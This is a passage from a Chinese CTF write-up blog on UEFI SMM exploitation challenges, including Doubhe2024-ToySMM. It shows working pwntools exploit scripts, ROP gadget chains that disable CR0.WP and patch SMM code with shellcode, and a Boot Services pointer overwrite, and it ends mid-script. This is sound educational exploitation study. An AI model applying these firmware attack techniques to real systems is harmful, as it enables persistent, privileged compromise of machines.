class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;debug.log&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">&#x27;CPU[000]  APIC ID=0000  SMBASE=&#x27;</span>):</span><br><span class="line">            smbase = <span class="built_in">int</span>(line[<span class="number">31</span>:<span class="number">31</span> + <span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Manually or programmatically extract GUIDs from MdePkg/MdePkg.dec</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> guid <span class="keyword">in</span> guids:</span><br><span class="line">    code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        /* LocateProtocol(&amp;guid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">        lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">        mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">        call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        test rax, rax</span></span><br><span class="line"><span class="string">        jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rax, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">        ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fail:</span></span><br><span class="line"><span class="string">        ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    guid:</span></span><br><span class="line"><span class="string">        .octa <span class="subst">&#123;guid&#125;</span></span></span><br><span class="line"><span class="string">    protocol:</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    conn.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">    proto = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> proto &gt; smbase:</span><br><span class="line">        log.info(<span class="string">&#x27;Interesting protocol: GUID = 0x%x, ADDR = 0x%x&#x27;</span>, guid, proto)</span><br></pre></td></tr></table></figure><p>果然，通过让脚本运行足够的时间，我们发现 <code>gEfiSmmConfigurationProtocolGuid</code> 返回一个指向协议地址的指针。查看已加载驱动程序的 <code>debug.log</code> ，我们可以看到该地址位于 <code>PiSmmCpuDxeSmm.efi</code> SMM 驱动程序内部，简单的减法即可得出其基地址。</p><h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><p>现在我们可以看一下 <code>PiSmmCpuDxeSmm.efi</code> 中的gadgets。事实证明，我们很幸运：</p><ul><li>从 GDB 来看，我们仍然有 R13、R14 和 R15 以完全相同的偏移量溢出到 SMI 堆栈上。</li><li>我们可以向前移动堆栈指针： <code>ret 0x6d</code></li><li>我们可以翻转堆栈： <code>pop rsp; ret</code></li><li>我们可以弹出 RAX 和其他寄存器： <code>pop rax ; pop rbx ; pop r12 ; ret</code></li><li>我们可以设置CR0： <code>mov cr0, rax ; wbinvd ; ret</code></li><li>我们有一个 write-what-where 原语： <code>mov qword ptr [rbx], rax ; pop rbx ; ret</code></li></ul><p>我们没有更多好的gadgets可以使用，所以这次在禁用 CR0.WP 后，我们不再使用 ROP 编写整个漏洞利用程序，而是使用 write-what-where gadget 来覆盖 <code>PiSmmCpuDxeSmm.efi</code> 的一段 <code>.text</code> 带有第 2 阶段 shellcode，然后简单地跳转到它。<br>唯一有点烦人的部分是 <code>ret 0x6d</code> gadget 将堆栈向前移动：这将导致堆栈未对齐，落在堆栈上溢出的 R13 值的 2 个最高有效字节中。<strong>这不是一个真正的问题，幸运的是 CPU（或者更好的是 QEMU）似乎并不关心未对齐的堆栈指针。</strong>我们只需使用 R{13,14,15} 进行一些位移即可将值很好地放入堆栈中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># SmmConfigurationProtocol leaked using <span class="title function_">LocateProtocol</span><span class="params">(gEfiSmmConfigurationProtocolGuid)</span></span><br><span class="line">PiSmmCpuDxeSmm_base = SmmConfigurationProtocol - <span class="number">0x16210</span></span><br><span class="line">PiSmmCpuDxeSmm_text = PiSmmCpuDxeSmm_base + <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&#x27;SmmConfigurationProtocol    @ 0x%x&#x27;</span>, SmmConfigurationProtocol)</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&#x27;=&gt; PiSmmCpuDxeSmm.efi       @ 0x%x&#x27;</span>, PiSmmCpuDxeSmm_base)</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&#x27;=&gt; PiSmmCpuDxeSmm.efi .text @ 0x%x&#x27;</span>, PiSmmCpuDxeSmm_text)</span><br><span class="line"></span><br><span class="line">new_smm_stack   = buffer + <span class="number">0x800</span></span><br><span class="line">ret_0x6d        = PiSmmCpuDxeSmm_base + <span class="number">0xfc8a</span>  <span class="meta"># ret 0x6d</span></span><br><span class="line">flip_stack      = PiSmmCpuDxeSmm_base + <span class="number">0x3c1c</span>  <span class="meta"># pop rsp ; ret</span></span><br><span class="line">pop_rax_rbx_r12 = PiSmmCpuDxeSmm_base + <span class="number">0xd228</span>  <span class="meta"># pop rax ; pop rbx ; pop r12 ; ret</span></span><br><span class="line">mov_cr0_rax     = PiSmmCpuDxeSmm_base + <span class="number">0x10a7d</span> <span class="meta"># mov cr0, rax ; wbinvd ; ret</span></span><br><span class="line">write_primitive = PiSmmCpuDxeSmm_base + <span class="number">0x3b8f</span>  <span class="meta"># mov qword ptr [rbx], rax ; pop rbx ; ret</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span>.encode(<span class="string">&#x27;utf-16-le&#x27;</span>) * <span class="number">200</span> + p64(ret_0x6d)</span><br></pre></td></tr></table></figure><p>正如我们刚才所说，我们将使用一些gadgets来创建 ROP 链，这些gadgets会将第二阶段 shellcode 写入 <code>PiSmmCpuDxeSmm.efi</code> 的 <code>.text</code> 中，然后跳转到它。该 shellcode 必须遍历页表（这次由于 ASLR，我们无法预先计算 PTE 的地址），设置 PTE 上的当前位，然后将标志读入（一个或多个）寄存器。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">stage2_shellcode = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    movabs rbx, 0xffffffff000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Walk page table */</span></span><br><span class="line"><span class="string">    mov rax, cr3</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax]</span></span><br><span class="line"><span class="string">    and rax, rbx</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 8 * 0x1]</span></span><br><span class="line"><span class="string">    and rax, rbx</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 8 * 0x22]</span></span><br><span class="line"><span class="string">    and rax, rbx</span></span><br><span class="line"><span class="string">    mov rbx, rax</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 8 * 0x40]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Set present bit */</span></span><br><span class="line"><span class="string">    or al, 1</span></span><br><span class="line"><span class="string">    mov qword ptr [rbx + 8 * 0x40], rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Read flag and die so regs get dumped, GG! */</span></span><br><span class="line"><span class="string">    movabs rax, 0x44440000</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax]</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">real_chain = [</span><br><span class="line">    <span class="comment"># Unset CR0.WP</span></span><br><span class="line">    pop_rax_rbx_r12, <span class="comment"># pop rax ; pop rbx ; pop r12 ; ret</span></span><br><span class="line">    <span class="number">0x80000033</span>     , <span class="comment"># -&gt; RAX</span></span><br><span class="line">    <span class="number">0xdeadbeef</span>     , <span class="comment"># filler</span></span><br><span class="line">    <span class="number">0xdeadbeef</span>     , <span class="comment"># filler</span></span><br><span class="line">    mov_cr0_rax    , <span class="comment"># mov cr0, rax ; wbinvd ; ret</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now that CR0.WP is unset, we can just patch SMM code and jump to it!</span></span><br><span class="line"><span class="comment"># Make the ROP chain write the stage 2 shellcode at PiSmmCpuDxeSmm_text</span></span><br><span class="line"><span class="comment"># 8 bytes at a time, then jump into it</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(stage2_shellcode), <span class="number">8</span>):</span><br><span class="line">    chunk = stage2_shellcode[i:i + <span class="number">8</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">    chunk = u64(chunk)</span><br><span class="line"></span><br><span class="line">    real_chain += [</span><br><span class="line">        pop_rax_rbx_r12        , <span class="comment"># pop rax ; pop rbx ; pop r12 ; ret</span></span><br><span class="line">        chunk                  , <span class="comment"># -&gt; RAX</span></span><br><span class="line">        PiSmmCpuDxeSmm_text + i, <span class="comment"># -&gt; RBX</span></span><br><span class="line">        <span class="number">0xdeadbeef</span>             ,</span><br><span class="line">        write_primitive        , <span class="comment"># mov qword ptr [rbx], rax ; pop rbx ; ret</span></span><br><span class="line">        <span class="number">0xdeadbeef</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">real_chain += [PiSmmCpuDxeSmm_text]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Transform real ROP chain into .quad directives to embed in the shellcode:</span></span><br><span class="line"><span class="comment">#   .quad 0x7f8a184</span></span><br><span class="line"><span class="comment">#   .quad 0x80000033</span></span><br><span class="line"><span class="comment">#    ...</span></span><br><span class="line">real_chain_size = <span class="built_in">len</span>(real_chain) * <span class="number">8</span></span><br><span class="line">real_chain      = <span class="string">&#x27;.quad &#x27;</span> + <span class="string">&#x27;\n.quad &#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, real_chain))</span><br></pre></td></tr></table></figure><p><strong>SMM的代码段是可写的,应该不是本题专属</strong></p><h2 id="Doubhe2024-ToySMM"><a href="#Doubhe2024-ToySMM" class="headerlink" title="Doubhe2024-ToySMM"></a>Doubhe2024-ToySMM</h2><p><em>有了前面三题的基础,这不是乱杀</em></p><p>先跑一下<code>run.sh</code>,看看程序是怎样运行的</p><p>启动后弹出了这么一个窗口</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">UEFI Interactive Shell v2.2</span><br><span class="line">EDK II</span><br><span class="line">UEFI v2.70 (EDK II, 0x00010000)</span><br><span class="line">Mapping table</span><br><span class="line">      FS0: Alias(s):HD0a65535a1:;BLK1:</span><br><span class="line">          PciRoot(0x0)/Pci(0x1F,0x2)/Sata(0x0,0xFFFF,0x0)/HD(1,MBR,0xBE1AFDFA,0x3F,0xFBFC1)</span><br><span class="line">     BLK0: Alias(s):</span><br><span class="line">          PciRoot(0x0)/Pci(0x1F,0x2)/Sata(0x0,0xFFFF,0x0)</span><br><span class="line">     BLK2: Alias(s):</span><br><span class="line">          PciRoot(0x0)/Pci(0x1F,0x2)/Sata(0x2,0xFFFF,0x0)</span><br><span class="line">Shell&gt; fs0:</span><br><span class="line">FS0:\&gt; mem</span><br><span class="line">Memory Address 00000000069EE018 78 Bytes</span><br><span class="line">  069EE018: 49 42 49 20 53 59 53 54-46 00 02 00 78 00 00 00  *IBI SYSTF...x...*</span><br><span class="line">  069EE028: F8 83 E2 1D 00 00 00 00-18 D1 9B 06 00 00 00 00  *................*</span><br><span class="line">  069EE038: 00 00 01 00 00 00 00 00-98 DF F6 05 00 00 00 00  *................*</span><br><span class="line">  069EE048: F0 22 F6 05 00 00 00 00-18 68 20 06 00 00 00 00  *.<span class="string">&quot;.......h .....*</span></span><br><span class="line"><span class="string">  069EE058: 20 D1 79 05 00 00 00 00-18 C9 F6 05 00 00 00 00  * .y.............*</span></span><br><span class="line"><span class="string">  069EE068: 90 21 F6 05 00 00 00 00-98 EB 9E 06 00 00 00 00  *.!..............*</span></span><br><span class="line"><span class="string">  069EE078: 80 6B FD 06 00 00 00 00-0A 00 00 00 00 00 00 00  *.k..............*</span></span><br><span class="line"><span class="string">  069EE088: 98 EC 9E 06 00 00 00 00-                         *........*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Valid EFI Header at Address 00000000069EE018</span></span><br><span class="line"><span class="string">---------------------------------------------</span></span><br><span class="line"><span class="string">System: Table Structure size 00000078 revision 00020046</span></span><br><span class="line"><span class="string">ConIn (0000000005F622F0) ConOut (000000000579D120) StdErr (0000000005F62190)</span></span><br><span class="line"><span class="string">Runtime Services 00000000069EEB98</span></span><br><span class="line"><span class="string">Boot Services    0000000006FD6B80</span></span><br><span class="line"><span class="string">SAL System Table 0000000000000000</span></span><br><span class="line"><span class="string">ACPI Table       0000000006B7E000</span></span><br><span class="line"><span class="string">ACPI 2.0 Table   0000000006B7E014</span></span><br><span class="line"><span class="string">MPS Table        0000000000000000</span></span><br><span class="line"><span class="string">SMBIOS Table     00000000069D7000</span></span><br><span class="line"><span class="string">FS0:\&gt; ToyApp</span></span><br><span class="line"><span class="string">$$$$$$$$$$$$$$$$$$$$$$$$$</span></span><br><span class="line"><span class="string">$$                     $$</span></span><br><span class="line"><span class="string">$$  UEFI BackDoor :)   $$</span></span><br><span class="line"><span class="string">$$  Ring 0 priviledge  $$</span></span><br><span class="line"><span class="string">$$                     $$</span></span><br><span class="line"><span class="string">$$$$$$$$$$$$$$$$$$$$$$$$$</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Type some shellcode with &#x27;DONE&#x27; on a seperate line and press enter to execute.</span></span><br><span class="line"><span class="string">Type &#x27;QUIT&#x27; to quit the program.</span></span><br><span class="line"><span class="string">Your shellcode:</span></span><br></pre></td></tr></table></figure><p>熟悉的uefishell任意执行shellcode</p><h3 id="TOYSMM"><a href="#TOYSMM" class="headerlink" title="TOYSMM"></a>TOYSMM</h3><p>使用uefitools处理OVMF_CODE.fd</p><p>工具打开固件包后,搜索题目的名字关键字<code>Toy</code></p><p>将找到的SMM驱动模块dump下来并ida打开</p><p>直奔<code>ChildSwSmiHandler</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS __fastcall <span class="title function_">ChildSwSmiHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">        EFI_HANDLE DispatchHandle,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">void</span> *Context,</span></span><br><span class="line"><span class="params">        _BYTE *CommBuffer,</span></span><br><span class="line"><span class="params">        UINTN *CommBufferSize)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+0h] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">32</span>]; <span class="comment">// [rsp+4h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !CommBuffer || !CommBufferSize )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x8000000000000002</span>ui64;</span><br><span class="line">  v5 = <span class="number">0x41414141</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !sub_2340(CommBuffer + <span class="number">16</span>, &amp;v5, <span class="number">3</span>i64) )</span><br><span class="line">    gBS-&gt;LocateProtocol(&amp;EFI_ACPI_TABLE_PROTOCOL_GUID, <span class="number">0</span>i64, (<span class="type">void</span> **)v6);</span><br><span class="line">  <span class="keyword">if</span> ( &amp;v5 != (<span class="type">int</span> *)<span class="number">0x23330000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !sub_2340((_BYTE *)<span class="number">0x23330000</span>, &amp;v5, <span class="number">3</span>i64) )</span><br><span class="line">      sub_1000();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sub_2340</code>函数用于匹配内存是否相等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_2340</span><span class="params">(_BYTE *a1, _BYTE *a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> v6; <span class="comment">// zf</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v6 = *a1++ == *a2++;</span><br><span class="line">    --a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 );</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)*(a1 - <span class="number">1</span>) - (<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)*(a2 - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sub_1000()</code>就直接getflag了</p><p>但是无论如何第二个条件是一定不会满足的</p><p>即</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !sub_2340((_BYTE *)<span class="number">0x23330000</span>, &amp;v5, 3i64) )</span><br><span class="line">      sub_1000();</span><br></pre></td></tr></table></figure><p>是永远不可能满足的</p><p>不过我们可以看到无论如何都是会执行</p><p><code>gBS-&gt;LocateProtocol(&amp;EFI_ACPI_TABLE_PROTOCOL_GUID, 0i64, (void **)v6);</code>的</p><p><strong>而且在DXE态下,我们是具有修改bootservice的权限的</strong>,那岂不是可以直接修改LocateProtocol函数指针为<code>sub_1000()</code>,然后发送SMI即可在<strong>SMM状态</strong>下任意地址执行</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Boot Services    &#x27;</span>)</span><br><span class="line">boot_service = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;BootService @ 0x%x&#x27;</span>, boot_service)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">AllocatePool = <span class="number">0x6fd12f1</span></span><br><span class="line">LocateProtocol = <span class="number">0x6fcc7b4</span></span><br><span class="line">mSmmCommunication = <span class="number">0x6ad9310</span></span><br><span class="line">Communicate = <span class="number">0x6ad6abf</span></span><br><span class="line">Guid = <span class="number">0x9D76F4B1548E0872EC86B7F3B31CF11E</span></span><br><span class="line"></span><br><span class="line">EfiRuntimeServicesData = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &amp;buffer) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;EfiRuntimeServicesData&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;AllocatePool&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(p.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&#x27;Allocated buffer @ 0x%x&#x27;</span>, buffer)</span><br><span class="line"><span class="comment">#//backdoor 0x7F06000</span></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov qword ptr [<span class="subst">&#123;boot_service + <span class="number">320</span>&#125;</span>], 0x7F06000</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, 0x38</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov r8, <span class="subst">&#123;buffer+<span class="number">0x30</span>&#125;</span></span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    mov r12, 0x23330000</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;Guid&#125;</span>  /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 0x18                              /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0                                 /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">    .quad 0</span></span><br><span class="line"><span class="string">    .quad 0x41414141</span></span><br><span class="line"><span class="string">    .quad 0x30</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(code.<span class="built_in">hex</span>().encode())</span><br><span class="line">p.sendline(<span class="string">b&#x27;done&#x27;</span>)</span><br><span class="line"></span><br><span 